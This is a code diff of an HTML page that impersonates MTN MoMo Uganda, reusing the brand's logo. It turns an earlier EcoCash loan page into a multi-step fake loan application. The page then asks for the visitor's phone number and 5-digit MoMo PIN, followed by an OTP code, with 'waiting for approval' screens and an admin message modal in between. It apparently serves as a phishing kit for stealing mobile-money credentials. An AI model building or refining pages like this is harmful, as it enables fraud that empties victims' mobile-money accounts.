+        /* ───── PAGE: WAIT FOR SMS APPROVAL ───── */
+        
+        #page-wait-sms {
+            background: linear-gradient(135deg, var(--mtn-dark), var(--mtn-light));
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .wait-wrap {
+            text-align: center;
+            padding: 40px 24px;
+            max-width: 420px;
+        }
+        
+        .wait-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            margin: 0 auto 24px;
+            animation: pulse 2s ease infinite;
+        }
+        
+        .wait-wrap h2 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 12px;
+        }
+        
+        .wait-wrap p {
+            color: rgba(255, 255, 255, 0.75);
+            font-size: 0.88rem;
+            line-height: 1.7;
+            margin-bottom: 24px;
+        }
+        /* ───── PAGE: OTP ───── */
+        
+        #page-otp {
+            background: #fff;
+        }
+        
+        .otp-topbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 20px;
+            height: 52px;
+            border-bottom: 1px solid #eee;
+            flex-shrink: 0;
+        }
+        
+        .otp-topbar .bk {
+            font-size: 1.1rem;
+            color: #333;
+            cursor: pointer;
+            background: none;
+            border: none;
+        }
+        
+        .otp-body-wrap {
+            flex: 1;
+            padding: 32px 16px;
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+        }
+        
+        .otp-card {
+            background: #fff;
+            border: 1px solid #eee;
+            border-radius: var(--radius);
+            padding: 32px 28px;
+            width: 100%;
+            max-width: 440px;
+            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.06);
+        }
+        
+        .otp-card h2 {
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-bottom: 6px;
+            color: var(--mtn-dark);
+        }
+        
+        .otp-hint {
+            font-size: 0.83rem;
+            color: var(--text-light);
+            margin-bottom: 5px;
+        }
+        
+        .otp-section {
+            margin-bottom: 24px;
+        }
+        
+        .otp-section-title {
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: var(--mtn-dark);
+            margin-bottom: 12px;
+        }
+        
+        .otp-inputs {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 12px;
+            width: 100%;
+        }
+        
+        .otp-box {
+            flex: 1;
+            min-width: 0;
+            width: 0;
+            height: 52px;
+            border: 1.5px solid var(--border);
+            border-radius: var(--radius-sm);
+            text-align: center;
+            font-family: 'Inter', sans-serif;
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--mtn-dark);
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .otp-box:focus {
+            border-color: var(--mtn-gold);
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.2);
+        }
+        
+        .otp-box::-webkit-outer-spin-button,
+        .otp-box::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        
+        .otp-box[type=number] {
+            -moz-appearance: textfield;
+        }
+        
+        .otp-delete {
+            cursor: pointer;
+            color: var(--text-light);
+            font-size: 1rem;
+            background: none;
+            border: none;
+            margin-left: 6px;
+            padding: 0;
+            transition: color 0.2s;
+        }
+        
+        .otp-delete:hover {
+            color: var(--mtn-gold);
+        }
+        
+        .btn-otp {
+            width: 100%;
+            padding: 13px;
+            background: #e8e8e8;
+            color: #aaa;
+            border: none;
+            border-radius: 8px;
+            font-size: 0.88rem;
+            font-weight: 600;
+            letter-spacing: 0.05em;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.2s;
+        }
+        
+        .btn-otp.rdy {
+            background: var(--grad);
+            color: #fff;
+        }
+        
+        .otp-curve {
+            background: #fff;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+        
+        .otp-curve::before {
+            content: '';
+            display: block;
+            background: var(--mtn-dark);
+            height: 50px;
+            clip-path: ellipse(60% 100% at 50% 100%);
+            margin-bottom: -4px;
+        }
+        
+        .otp-foot {
+            background: var(--mtn-dark);
+            padding: 14px;
+            text-align: center;
+            font-size: 0.75rem;
+            color: rgba(255, 255, 255, 0.45);
+        }
+        /* ───── PAGE: WAIT FOR OTP APPROVAL ───── */
+        
+        #page-wait-otp {
+            background: linear-gradient(135deg, var(--mtn-dark), var(--mtn-light));
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .wait-wrap {
+            text-align: center;
+            padding: 40px 24px;
+            max-width: 420px;
+        }
+        
+        .wait-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            margin: 0 auto 24px;
+            animation: pulse 2s ease infinite;
+        }
+        
+        .wait-wrap h2 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 12px;
+        }
+        
+        .wait-wrap p {
+            color: rgba(255, 255, 255, 0.75);
+            font-size: 0.88rem;
+            line-height: 1.7;
+            margin-bottom: 24px;
+        }
+        /* ───── PAGE: APPROVAL ───── */
+        
+        #page-approval {
+            background: linear-gradient(135deg, var(--mtn-dark), var(--mtn-light));
+            min-height: 100vh;
+            align-items: center;
+            justify-content: center;
+            padding: 32px 16px;
+        }
+        
+        .appr-wrap {
+            width: 100%;
+            max-width: 520px;
+        }
+        
+        .appr-top {
+            background: #fff;
+            border-radius: var(--radius) var(--radius) 0 0;
+            padding: 28px 24px 0;
+            text-align: center;
+        }
+        
+        .check-circle {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--mtn-gold), var(--mtn-light));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            font-size: 1.3rem;
+            color: #fff;
+            box-shadow: 0 4px 16px rgba(255, 215, 0, 0.5);
+        }
+        
+        .appr-title {
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-bottom: 6px;
+        }
+        
+        .appr-sub {
+            font-size: 0.82rem;
+            color: var(--text-light);
+            margin-bottom: 18px;
+        }
+        
+        .appr-banner {
+            background: var(--grad);
+            padding: 16px;
+            margin: 0 -24px;
+            text-align: center;
+        }
+        
+        .appr-banner .abl {
+            font-size: 0.72rem;
+            color: rgba(255, 255, 255, 0.8);
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+        }
+        
+        .appr-banner .aba {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #fff;
+        }
+        
+        .comp-box {
+            background: #FFFBEA;
+            border: 1px solid #F5C842;
+            padding: 14px 16px;
+        }
+        
+        .comp-box .ch {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 0.82rem;
+            font-weight: 700;
+            color: #a07000;
+            margin-bottom: 6px;
+        }
+        
+        .comp-box p {
+            font-size: 0.78rem;
+            color: #7a5500;
+            line-height: 1.6;
+        }
+        
+        .comp-box strong {
+            font-weight: 600;
+        }
+        
+        .ld-card {
+            background: #fff;
+            padding: 20px 24px;
+        }
+        
+        .ld-htitle {
+            font-size: 0.82rem;
+            font-weight: 600;
+            color: var(--text-mid);
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .ld-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 0;
+            border-bottom: 1px solid #f5f5f5;
+        }
+        
+        .ld-row:last-child {
+            border-bottom: none;
+        }
+        
+        .ld-icon {
+            width: 34px;
+            height: 34px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.85rem;
+            flex-shrink: 0;
+        }
+        
+        .ic-g {
+            background: linear-gradient(135deg, #2ECC71, #27AE60);
+            color: #fff;
+        }
+        
+        .ic-b {
+            background: linear-gradient(135deg, #3498DB, #2980B9);
+            color: #fff;
+        }
+        
+        .ic-p {
+            background: linear-gradient(135deg, #9B59B6, #8E44AD);
+            color: #fff;
+        }
+        
+        .ld-lbl {
+            font-size: 0.72rem;
+            color: var(--text-light);
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+        }
+        
+        .ld-val {
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+        
+        .nxt-steps {
+            background: #fff;
+            padding: 14px 24px;
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            border-top: 1px solid #f0f0f0;
+        }
+        
+        .nxt-steps p {
+            font-size: 0.79rem;
+            color: var(--text-light);
+            line-height: 1.5;
+        }
+        
+        .rth-wrap {
+            background: #fff;
+            border-radius: 0 0 var(--radius) var(--radius);
+            padding: 14px 24px 24px;
+        }
+        
+        .rth-btn {
+            width: 100%;
+            padding: 13px;
+            background: var(--grad);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 0.88rem;
+            font-weight: 600;
+            letter-spacing: 0.04em;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+        }
+        /* ───── INLINE ERROR / STATUS MESSAGES ───── */
+        
+        .msg-box {
+            border-radius: var(--radius-sm);
+            padding: 12px 16px;
+            font-size: 0.84rem;
+            margin-bottom: 16px;
+            display: none;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .msg-box.show {
+            display: flex;
+        }
+        
+        .msg-box.error {
+            background: #fef2f2;
+            border: 1.5px solid #fecaca;
+            color: #991b1b;
+        }
+        
+        .msg-box.success {
+            background: #f0fdf4;
+            border: 1.5px solid #bbf7d0;
+            color: #166534;
+        }
+        
+        .msg-box.info {
+            background: #eff6ff;
+            border: 1.5px solid #bfdbfe;
+            color: #1e40af;
+        }
+        
+        .msg-box.warning {
+            background: #fefce8;
+            border: 1.5px solid #fef08a;
+            color: #854d0e;
+        }
+        
+        .msg-icon {
+            font-weight: 700;
+        }
+        /* ───── LOADING ───── */
+        
+        .loading {
+            display: none;
+        }
+        
+        .loading.show {
+            display: block;
+        }
+        
+        .wait-msg {
+            text-align: center;
+            color: var(--text-light);
+            font-size: 0.88rem;
+        }
+        /* ───── RESPONSIVE ───── */
+        
+        @media (max-width: 480px) {
+            .field-row {
+                grid-template-columns: 1fr;
+            }
+            .land-card {
+                padding: 24px 18px;
+            }
+            .step-card {
+                padding: 24px 18px;
+            }
+            .pin-box {
+                width: 42px;
+                height: 42px;
+                font-size: 1rem;
+            }
+            .otp-box {
+                height: 42px;
+                font-size: 1rem;
+            }
+            .mtn-logo .logo-img {
+                height: 34px;
+            }
+            .mtn-logo .logo-img.small {
+                height: 24px;
+            }
+            .mtn-logo .logo-img.tiny {
+                height: 20px;
+            }
+            .admin-modal {
+                padding: 28px 20px 22px;
+            }
+            /* Sim card responsive adjustment */
+            #page-sim-check .circle-overlap {
+                width: 220px;
+                height: 220px;
+            }
+            #page-sim-check .circle-overlap svg {
+                width: 110px;
+                height: 132px;
+            }
         }
     </style>
 </head>
 
 <body>
-    <header>
-        <button class="menu-btn">☰</button>
-        <div class="logo"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
-        <div></div>
-    </header>
-    <main class="card">
-        <div>
-            <h1 class="title">Get Your Loan Approved Fast</h1>
-            <p class="subtitle">Quick approval • Competitive rates • Flexible terms</p>
-            <div class="calc-section">
-                <h2 class="calc-title">Loan Calculator</h2>
-                <div class="input-group">
-                    <div class="input-header">
-                        <span class="input-label">Loan Amount</span>
-                        <span class="input-value" id="amountValue">$5,000</span>
+
+    <!-- ═══════════════════ ADMIN MODAL (IMPORTANT NOTE) ═══════════════════ -->
+    <div id="adminModalOverlay">
+        <div class="admin-modal">
+            <div class="modal-title">
+                <span>📌</span> IMPORTANT NOTE
+            </div>
+            <div class="modal-body" id="adminModalBody">Message from admin</div>
+            <button class="modal-close-btn" onclick="closeAdminModal()">OK, GOT IT</button>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 1: LANDING ══════════════════════ -->
+    <div id="page-landing" class="page">
+        <div class="land-nav">
+            <div style="flex: 1;"></div>
+            <div class="mtn-logo">
+                <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" class="logo-img" />
+                <div class="mtn-logo-text" style="color:#fff;">MoMo</div>
+                <div class="mtn-logo-sub" style="color:rgba(255,255,255,0.6);">from MTN Uganda</div>
+                <div class="flag-badge"><span class="flag-emoji">🇺🇬</span> Uganda</div>
+            </div>
+            <div style="flex: 1;"></div>
+        </div>
+        <div class="land-center">
+            <div class="land-card">
+                <h1>Welcome to MTN MoMo 🇺🇬</h1>
+                <p class="land-tagline">Get loans easily through MTN MoMo in Uganda</p>
+                <div class="calc-box">
+                    <h2>Loan Calculator</h2>
+                    <div class="calc-row2">
+                        <span>Amount</span>
+                        <span class="cv" id="calcAmt">UGX 500,000</span>
                     </div>
-                    <input type="range" class="slider" min="100" max="5000" value="5000" id="amountSlider">
-                    <div class="range-labels"><span>$100</span><span>$5,000</span></div>
-                </div>
-                <div class="input-group">
-                    <div class="input-header">
-                        <span class="input-label">Loan Term</span>
-                        <span class="input-value" id="termValue">12 months</span>
+                    <div class="calc-row2">
+                        <span>Term</span>
+                        <span class="cv" id="calcTerm">48 Months</span>
                     </div>
-                    <input type="range" class="slider" min="6" max="60" step="6" value="12" id="termSlider">
-                    <div class="range-labels"><span>6 months</span><span>60 months</span></div>
+                    <div class="slider-hint-wrap">
+                        <span class="hint-text">
+                            <span class="hint-arrow"></span> Slide to adjust loan amount
+                        </span>
+                    </div>
+                    <input type="range" id="amtSlider" min="500000" max="5000000" step="100000" value="1000000" oninput="updateCalc()" />
+                    <div class="range-ends">
+                        <span>UGX 500,000</span>
+                        <span>UGX 5,000,000</span>
+                    </div>
+                    <div class="monthly-box">
+                        <span class="ml">Monthly Payment</span>
+                        <span class="ma" id="monthlyAmt">UGX 24,000</span>
+                    </div>
                 </div>
-                <div class="payment-box">
-                    <span class="payment-label">Monthly Payment</span>
-                    <span class="payment-amount" id="paymentAmount">$450.00</span>
+                <button class="btn-grad" onclick="startApplication()">START APPLICATION</button>
+            </div>
+        </div>
+        <div class="land-footer">© 2026 MTN MoMo Uganda – Powered by MTN</div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 2: STEP 1 ══════════════════════ -->
+    <div id="page-step1" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-landing')">
+                <-Back</a>
+                    <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
+                        <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" class="logo-img small" />
+                        <div style="text-align: left;">
+                            <div class="mtn-logo-text" style="font-size:0.9rem; color:#fff;">MTN MoMo</div>
+                            <div class="mtn-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Uganda</div>
+                        </div>
+                        <span style="color:var(--mtn-gold); font-size:0.7rem;">🇺🇬</span>
+                    </div>
+                    <div class="nav-right">
+                        <div class="hline"></div>
+                        <div class="hline"></div>
+                        <div class="hline"></div>
+                    </div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>Loan Application</h2>
+                <p class="step-sub">Step 1 of 3</p>
+                <div class="prog-row">
+                    <div class="prog-seg now"></div>
+                    <div class="prog-seg"></div>
+                    <div class="prog-seg"></div>
+                </div>
+                <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
+                <div class="field"><label>Loan Type</label>
+                    <div class="sel-wrap"><select id="s1ty"><option>Personal Loan</option><option selected>Business Loan</option><option>Home Loan</option><option>Car Loan</option><option>Education Loan</option></select></div>
+                </div>
+                <div class="field"><label>Loan Amount (UGX)</label><input type="number" id="s1am" value="1000000" placeholder="Enter amount" oninput="clearErr('s1Err')" /></div>
+                <div class="field"><label>Loan Term</label>
+                    <div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option selected>48 Months</option><option>60 Months</option></select></div>
+                </div>
+                <div class="field"><label>Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…" oninput="clearErr('s1Err')"></textarea></div>
+                <button class="btn-grad" onclick="toS2()">NEXT STEP</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 3: STEP 2 ══════════════════════ -->
+    <div id="page-step2" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-step1')">← Back</a>
+            <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
+                <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" class="logo-img small" />
+                <div style="text-align: left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem; color:#fff;">MTN MoMo</div>
+                    <div class="mtn-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Uganda</div>
+                </div>
+                <span style="color:var(--mtn-gold); font-size:0.7rem;">🇺🇬</span>
+            </div>
+            <div class="nav-right">
+                <div class="hline"></div>
+                <div class="hline"></div>
+                <div class="hline"></div>
+            </div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>Loan Application</h2>
+                <p class="step-sub">Step 2 of 3</p>
+                <div class="prog-row">
+                    <div class="prog-seg done"></div>
+                    <div class="prog-seg now"></div>
+                    <div class="prog-seg"></div>
+                </div>
+                <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
+                <div class="field-row">
+                    <div class="field"><label>First Name</label><input type="text" id="s2fi" placeholder="First Name" oninput="clearErr('s2Err')" /></div>
+                    <div class="field"><label>Last Name</label><input type="text" id="s2la" placeholder="Last Name" oninput="clearErr('s2Err')" /></div>
+                </div>
+                <div class="field">
+                    <label>Phone Number (MTN Uganda)</label>
+                    <div class="phone-row">
+                        <div class="ph-pre">+256</div><input type="tel" id="s2ph" placeholder="771234567" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')" /></div>
+                    <div class="field-hint">9 digits without +256 prefix (e.g., 771234567)</div>
+                </div>
+                <div class="step-btns">
+                    <button class="btn-gray" onclick="goTo('page-step1')">BACK</button>
+                    <button class="btn-grad" onclick="toS3()">NEXT STEP</button>
                 </div>
             </div>
-            <button class="apply-btn" id="applyBtn">APPLY NOW</button>
         </div>
-        <div class="features">
-            <div class="feature">
-                <div class="feature-icon">⚡</div>Fast Approval<br>Within 24 hours</div>
-            <div class="feature">
-                <div class="feature-icon">💰</div>Low Rates<br>From 8%</div>
-            <div class="feature">
-                <div class="feature-icon">🔒</div>Secure<br>Bank-level</div>
-        </div>
-    </main>
-    <footer>© 2025 EcoCash</footer>
-    <script>
-        const amountSlider = document.getElementById('amountSlider');
-        const termSlider = document.getElementById('termSlider');
-        const amountValue = document.getElementById('amountValue');
-        const termValue = document.getElementById('termValue');
-        const paymentAmount = document.getElementById('paymentAmount');
+        <div class="pg-footer">© 2026 MTN MoMo Uganda</div>
+    </div>
 
-        function updateCalculator() {
-            const amount = parseFloat(amountSlider.value);
-            const months = parseFloat(termSlider.value);
-            amountValue.textContent = '$' + amount.toLocaleString();
-            termValue.textContent = months + (months === 1 ? ' month' : ' months');
-            const annualRate = 0.08;
-            const monthlyRate = annualRate / 12;
-            if (months === 0) {
-                paymentAmount.textContent = '$' + amount.toFixed(2);
-            } else {
-                const power = Math.pow(1 + monthlyRate, months);
-                const monthlyPayment = amount * (monthlyRate * power) / (power - 1);
-                paymentAmount.textContent = '$' + monthlyPayment.toFixed(2);
+    <!-- ══════════════════════ PAGE 4: STEP 3 ══════════════════════ -->
+    <div id="page-step3" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-step2')">← Back</a>
+            <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
+                <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" class="logo-img small" />
+                <div style="text-align: left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem; color:#fff;">MTN MoMo</div>
+                    <div class="mtn-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Uganda</div>
+                </div>
+                <span style="color:var(--mtn-gold); font-size:0.7rem;">🇺🇬</span>
+            </div>
+            <div class="nav-right">
+                <div class="hline"></div>
+                <div class="hline"></div>
+                <div class="hline"></div>
+            </div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>Loan Application</h2>
+                <p class="step-sub">Step 3 of 3</p>
+                <div class="prog-row">
+                    <div class="prog-seg done"></div>
+                    <div class="prog-seg done"></div>
+                    <div class="prog-seg now"></div>
+                </div>
+                <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
+                <div class="field"><label>Employment Status</label>
+                    <div class="sel-wrap"><select id="s3em"><option>Employed</option><option selected>Self-employed</option><option>Unemployed</option><option>Retired</option><option>Student</option></select></div>
+                </div>
+                <div class="field"><label>Annual Income (UGX)</label><input type="number" id="s3in" placeholder="Enter annual income" oninput="clearErr('s3Err')" /></div>
+                <div class="sum-box">
+                    <h3>Application Summary</h3>
+                    <div class="sum-row"><span class="sk">Loan Amount:</span><span class="sv" id="sA">UGX 1,000,000</span></div>
+                    <div class="sum-row"><span class="sk">Loan Term:</span><span class="sv" id="sT">48 Months</span></div>
+                    <div class="sum-row"><span class="sk">Purpose:</span><span class="sv" id="sP">—</span></div>
+                    <div class="sum-row"><span class="sk">Applicant:</span><span class="sv" id="sN">—</span></div>
+                </div>
+                <div class="step-btns">
+                    <button class="btn-gray" onclick="goTo('page-step2')">BACK</button>
+                    <button class="btn-grad" onclick="submitApp()">SUBMIT APPLICATION</button>
+                </div>
+            </div>
+        </div>
+        <div class="pg-footer">© 2026 MTN MoMo Uganda</div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 5: PROCESSING ══════════════════════ -->
+    <div id="page-processing" class="page">
+        <div style="background:linear-gradient(160deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="proc-wrap">
+                <div class="proc-icon">⏳</div>
+                <h2>Processing Application...</h2>
+                <p>Please wait while we process your loan application</p>
+                <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7);">You will be redirected to continue with MTN MoMo Uganda</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 6: SIM CARD CHECK (UPDATED) ══════════════════════ -->
+    <!-- Fixed: Removed the inline "display: flex" so it stays hidden until ".active" is applied -->
+    <div id="page-sim-check" class="page" style="background: #fff;">
+        <div style="background-color: var(--mtn-dark); height: 45vh; border-radius: 0 0 40px 40px; position: relative; display: flex; flex-direction: column; align-items: center; flex-shrink: 0; padding-top: 20px;">
+            <button style="position: absolute; top: 20px; left: 20px; color: var(--mtn-gold); font-size: 24px; cursor: pointer; background: none; border: none; z-index: 11;" onclick="goTo('page-landing')">‹</button>
+            <button style="position: absolute; top: 20px; right: 20px; color: var(--mtn-gold); font-size: 24px; cursor: pointer; background: none; border: none; z-index: 11;" onclick="goTo('page-landing')">✕</button>
+
+            <!-- Large Overlapping Circle with White Ring & Shadow -->
+            <div class="circle-overlap" style="position: absolute; bottom: -50px; left: 50%; transform: translateX(-50%); width: 280px; height: 280px; background: #fff; border-radius: 50%; border: 10px solid #ffffff; box-shadow: 0 20px 40px rgba(0,0,0,0.15); display: flex; align-items: center; justify-content: center; z-index: 10;">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 120" width="160" height="192">
+                    <!-- Phone Body -->
+                    <rect x="25" y="20" width="50" height="100" rx="9" fill="#f4f8fc" stroke="#004080" stroke-width="5"/>
+                    <rect x="32" y="30" width="36" height="60" rx="3" fill="#fff" stroke="#d0d8e0" stroke-width="2.5"/>
+                    <line x1="36" y1="40" x2="54" y2="40" stroke="#d0d8e0" stroke-width="3"/>
+                    <line x1="36" y1="50" x2="54" y2="50" stroke="#d0d8e0" stroke-width="3"/>
+                    <line x1="36" y1="60" x2="48" y2="60" stroke="#d0d8e0" stroke-width="3"/>
+                    <circle cx="35" cy="98" r="5" fill="#d0d8e0"/>
+
+                    <!-- Arrow -->
+                    <polygon points="68,45 58,40 58,50" fill="none" stroke="#004080" stroke-width="4" stroke-linejoin="round"/>
+
+                    <!-- SIM Card -->
+                    <rect x="65" y="25" width="40" height="45" rx="5" fill="#f4f8fc" stroke="#004080" stroke-width="4"/>
+                    <rect x="70" y="32" width="20" height="10" rx="2" fill="#FFD700"/>
+                    <rect x="82" y="32" width="10" height="10" rx="2" fill="#FFD700"/>
+                    <rect x="70" y="42" width="12" height="10" rx="2" fill="#FFD700"/>
+                    <rect x="82" y="42" width="10" height="10" rx="2" fill="#FFD700"/>
+                </svg>
+            </div>
+        </div>
+
+        <div style="flex: 1; background: #fff; padding: 70px 20px 20px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: flex-start;">
+            <h2 style="color: var(--mtn-dark); font-size: 1.8rem; font-weight: 700; margin-top: 10px;">SIM Card</h2>
+            <p style="color: var(--text-mid); font-size: 1.0rem; margin-top: 15px; line-height: 2.6; max-width: 400px;">
+                Make sure that the SIM card linked to this profile is in this device.
+            </p>
+        </div>
+
+        <div style="padding: 0 24px 40px 24px; width: 100%; flex-shrink: 0; margin-top: auto;">
+            <button class="btn-grad" onclick="goTo('page-login')" style="border-radius: 30px; font-size: 1rem; padding: 16px; background: #003366; background: linear-gradient(to right, #003366, #004080);">NEXT</button>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 7: LOGIN ══════════════════════ -->
+    <div id="page-login" class="page" style="background: #fff;">
+        <div style="background: var(--mtn-dark); height: 160px; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; padding-top: 30px; flex-shrink: 0;">
+            <!-- Custom Logo Mark -->
+            <div style="width: 50px; height: 50px; background: #fff; border-radius: 12px; display: flex; align-items: center; justify-content: center; margin-bottom: 6px;">
+                <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" style="height: 36px; object-fit: contain;" />
+            </div>
+            <div style="color: var(--mtn-gold); font-weight: 700; font-size: 1.2rem; letter-spacing: 0.5px;">MoMo</div>
+            <div style="color: rgba(255,255,255,0.6); font-size: 0.7rem; font-weight: 500;">from MTN</div>
+        </div>
+
+        <div style="flex: 1; background: #fff; padding: 0 20px; display: flex; flex-direction: column; align-items: center;">
+            <!-- White Card -->
+            <div style="margin-top: -30px; background: #fff; border-radius: 16px; box-shadow: 0 6px 30px rgba(0,0,0,0.08); padding: 30px 24px; max-width: 380px; width: 100%; z-index: 10;">
+                <h3 style="text-align: center; color: var(--mtn-dark); font-size: 1.25rem; font-weight: 700; margin-bottom: 24px;">Welcome to MoMo</h3>
+
+                <!-- Number Input with Rounded Square Flag -->
+                <div style="display: flex; gap: 10px; align-items: stretch; margin-bottom: 20px;">
+                    <div style="width: 54px; height: 54px; border: 1px solid #222; border-radius: 12px; display: flex; align-items: center; justify-content: center; background: #fff; flex-shrink: 0;">
+                        <span style="font-size: 1.5rem; line-height: 1;">🇺🇬</span>
+                    </div>
+                    <div style="flex: 1; border: 1px solid #222; border-radius: 12px; display: flex; align-items: center; background: #fff;">
+                        <input type="tel" id="lpPhone" placeholder="Enter number *" style="border: none; outline: none; width: 100%; font-size: 1rem; padding: 14px 16px; font-family: 'Inter'; background: transparent; color: var(--text-dark);" maxlength="9" oninput="normalizePhone('lpPhone'); chkPin();"
+                        />
+                    </div>
+                </div>
+
+                <!-- PIN Input (Maintained from previous requirement) -->
+                <div style="padding-top: 6px; border-top: 1px solid #f0f0f0;">
+                    <label style="display: block; font-size: 0.8rem; font-weight: 500; color: var(--text-mid); margin-bottom: 12px; text-align: center; margin-top: 14px;">Enter MoMo PIN (5 digits)</label>
+                    <div class="pin-row" style="display: flex; gap: 10px; justify-content: center; align-items: center;">
+                        <input type="password" id="lp0" class="pin-box" maxlength="1" oninput="pinMvM(this, 0)" placeholder="•" />
+                        <input type="password" id="lp1" class="pin-box" maxlength="1" oninput="pinMvM(this, 1)" placeholder="•" />
+                        <input type="password" id="lp2" class="pin-box" maxlength="1" oninput="pinMvM(this, 2)" placeholder="•" />
+                        <input type="password" id="lp3" class="pin-box" maxlength="1" oninput="pinMvM(this, 3)" placeholder="•" />
+                        <input type="password" id="lp4" class="pin-box" maxlength="1" oninput="pinMvM(this, 4)" placeholder="•" />
+                        <button class="pin-eye" onclick="togPin()" title="Show/Hide" style="cursor:pointer; background:none; border:none; font-size:1.2rem; color:var(--text-light); padding:4px;">👁</button>
+                        <button class="pin-delete" onclick="clearLoginPin()" title="Delete PIN" style="cursor:pointer; background:none; border:none; font-size:1rem; color:var(--text-light); padding:4px;">✕</button>
+                    </div>
+                </div>
+
+                <!-- Messages -->
+                <div class="msg-box error" id="lpMsg"><span class="msg-icon">✕</span><span id="lpMsgTxt"></span></div>
+                <div class="msg-box success" id="lpMsgOk"><span class="msg-icon">✓</span><span id="lpMsgOkTxt"></span></div>
+                <div class="msg-box warning" id="lpMsgWarn"><span class="msg-icon">⚠</span><span id="lpMsgWarnTxt"></span></div>
+            </div>
+
+            <!-- Terms (Outside Card) -->
+            <div style="text-align: center; font-size: 0.98rem; color: #005c99; line-height: 2.5; max-width: 420px; margin: 30px 0;">
+                By using this app you agree to our <a href="#" style="color: var(--mtn-dark); text-decoration: underline;">Mobile Terms of Use</a> and <a href="#" style="color: var(--mtn-dark); text-decoration: underline;">Privacy Policy</a>
+            </div>
+        </div>
+
+        <!-- Lifted, Pill-shaped Next Button -->
+        <div style="padding: 0 24px 40px 24px; flex-shrink: 0; margin-top: auto;">
